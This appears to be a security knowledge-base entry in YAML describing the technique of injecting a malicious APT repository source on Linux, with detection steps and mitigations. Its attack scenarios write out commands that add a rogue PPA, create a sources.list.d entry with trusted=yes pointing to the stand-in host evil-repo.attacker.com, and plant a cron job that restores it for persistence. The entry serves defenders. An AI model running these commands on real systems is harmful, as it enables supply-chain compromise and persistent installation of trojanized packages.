---
name: "Malicious APT Repository Source Injection"
packageManager: "apt"
slug: "apt-malicious-repo-source"
category: "Source Manipulation"
severity: "high"
platform:
  - "Linux"
description: "APT resolves and installs packages from repository sources configured in /etc/apt/sources.list and /etc/apt/sources.list.d/. An attacker with root or sudo access can add a malicious repository source, enabling the installation of trojanized packages that appear legitimate. This technique is commonly abused in post-exploitation to establish persistence or as part of supply chain attacks where users are socially engineered into adding untrusted PPAs or third-party repositories."
prerequisites:
  - "Root or sudo access on the target system to modify APT source configurations"
  - "Network connectivity from the target to the attacker-controlled repository server"
  - "An attacker-controlled server hosting a valid APT repository structure (Packages, Release files)"
attackScenarios:
  - title: "Adding a Malicious PPA via add-apt-repository"
    description: "An attacker convinces a user (e.g., via a malicious tutorial or README) to add a Personal Package Archive (PPA) that contains backdoored versions of popular packages. Once added and updated, any install or upgrade from this source pulls attacker-controlled packages."
    commands:
      - label: "Add the attacker-controlled PPA"
        code: |
          sudo add-apt-repository ppa:attacker/malicious-ppa
          sudo apt-get update
        language: "bash"
      - label: "Install a trojanized package from the rogue repo"
        code: |
          sudo apt-get install -y target-package
        language: "bash"
  - title: "Manually Injecting a Repository Source File"
    description: "An attacker with root access directly writes a new sources.list.d entry pointing to an attacker-controlled APT repository. This is stealthier than using add-apt-repository as it does not require the software-properties-common package and avoids interactive prompts."
    commands:
      - label: "Create a malicious source entry"
        code: |
          echo "deb [trusted=yes] http://evil-repo.attacker.com/apt stable main" | sudo tee /etc/apt/sources.list.d/updates-extra.list
        language: "bash"
      - label: "Update package lists to include the malicious repo"
        code: |
          sudo apt-get update
        language: "bash"
      - label: "Install or upgrade packages from the malicious source"
        code: |
          # The malicious repo can serve higher-versioned packages to override legitimate ones
          sudo apt-get install target-package
        language: "bash"
  - title: "Persistence via Automatic Repository Re-addition"
    description: "An attacker plants a cron job or systemd timer that re-adds the malicious repository source if it is removed by an administrator, ensuring persistent access to the attacker's package supply chain."
    commands:
      - label: "Create a persistence mechanism that restores the malicious source"
        code: |
          cat > /etc/cron.d/repo-check << 'EOF'
          */5 * * * * root [ ! -f /etc/apt/sources.list.d/updates-extra.list ] && echo "deb [trusted=yes] http://evil-repo.attacker.com/apt stable main" > /etc/apt/sources.list.d/updates-extra.list && apt-get update -o Dir::Etc::sourcelist="sources.list.d/updates-extra.list" -o Dir::Etc::sourceparts="-" -qq
          EOF
        language: "bash"
detection:
  - title: "Monitor APT source configuration changes"
    description: "Track file modifications to /etc/apt/sources.list and all files under /etc/apt/sources.list.d/ using file integrity monitoring or inotify-based tools. Any unexpected additions should trigger an alert."
    commands:
      - code: |
          # List all configured APT sources and review for unknown entries
          grep -r "^deb " /etc/apt/sources.list /etc/apt/sources.list.d/ 2>/dev/null
          # Check for recently modified source files
          find /etc/apt/sources.list.d/ -type f -mtime -1 -ls
          # Use inotifywait to monitor in real-time
          inotifywait -m -r -e modify,create,delete /etc/apt/sources.list.d/
        language: "bash"
  - title: "Audit installed repository keys and origins"
    description: "Review which GPG keys are trusted by APT and verify that all configured repositories correspond to expected, legitimate sources. Look for repositories using the trusted=yes option which bypasses signature verification entirely."
    commands:
      - code: |
          # List all trusted APT keys
          apt-key list 2>/dev/null || gpg --list-keys --keyring /etc/apt/trusted.gpg
          # Check for repos that skip GPG verification
          grep -r "trusted=yes" /etc/apt/sources.list /etc/apt/sources.list.d/
          # Show package origins
          apt-cache policy | grep -E "http|https"
        language: "bash"
mitigation:
  - "Restrict write access to /etc/apt/sources.list and /etc/apt/sources.list.d/ to authorized configuration management tools only"
  - "Implement file integrity monitoring (AIDE, Tripwire, OSSEC) on APT configuration directories"
  - "Never add PPAs or third-party repositories from untrusted sources or unverified documentation"
  - "Require GPG signature verification for all repositories; never use trusted=yes in production"
  - "Use immutable infrastructure patterns where package sources are defined in build-time configurations and cannot be modified at runtime"
  - "Audit /etc/apt/sources.list.d/ as part of regular security reviews and compliance checks"
references:
  - title: "Debian Wiki - SourcesList"
    url: "https://wiki.debian.org/SourcesList"
  - title: "Ubuntu Manpage - add-apt-repository"
    url: "https://manpages.ubuntu.com/manpages/jammy/man1/add-apt-repository.1.html"
  - title: "Debian Wiki - SecureApt"
    url: "https://wiki.debian.org/SecureApt"
created: 2026-04-02
updated: 2026-04-02
---
